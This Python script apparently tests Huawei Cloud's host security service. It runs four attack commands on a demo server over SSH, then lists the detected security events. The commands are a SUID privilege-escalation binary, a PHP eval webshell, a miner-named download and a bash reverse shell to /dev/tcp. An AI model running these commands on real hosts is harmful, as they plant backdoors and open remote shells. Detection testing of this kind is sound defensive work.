#!/usr/bin/env python3
"""04 触发危险命令并验证 HSS 检出。"""
import json
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import load_config, hss_client, ssh_exec

from huaweicloudsdkhss.v5 import ListSecurityEventsRequest

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# 每条命令都会创建「新的」危险对象，保证每次都能触发新事件
COMMANDS = [
    ("提权（SUID）", 'f=/usr/bin/demo_$(date +%s%N); cp /bin/true "$f" && chmod u+s "$f" && echo "created $f"'),
    ("Webshell 写入", 'f=/tmp/shell_$(date +%s%N).php; echo "<?php @eval(\\$_POST[c]);?>" > "$f" && echo "created $f"'),
    ("挖矿木马下载", 'f=/tmp/xmrig_$(date +%s%N); curl -s http://127.0.0.1/xmrig -o "$f"; chmod +x "$f"; echo "created $f"'),
    ("反弹 Shell", 'timeout 5 bash -c "bash -i >& /dev/tcp/8.8.8.8/53 0>&1" 2>/dev/null; echo triggered'),
]


def main():
    cfg = load_config()
    st = json.load(open(os.path.join(BASE, "state.json")))
    password = open(os.path.join(BASE, "demo_password.txt")).read().strip()
    cli = hss_client(cfg)
    host_id = st["server_id"]

    for name, cmd in COMMANDS:
        print(f"▶ 触发【{name}】")
        print("  ", ssh_exec(st["public_ip"], password, cmd))

    print("\n等待 HSS 检出（30–90 秒）…")
    time.sleep(60)
    r = cli.list_security_events(ListSecurityEventsRequest(host_id=host_id, limit=50))
    print(f"\n安全事件总数: {r.total_num}")
    for ev in (r.data_list or []):
        print("  -", getattr(ev, "event_name", None), "|", getattr(ev, "severity", None),
              "|", getattr(ev, "occur_time", None))


if __name__ == "__main__":
    main()
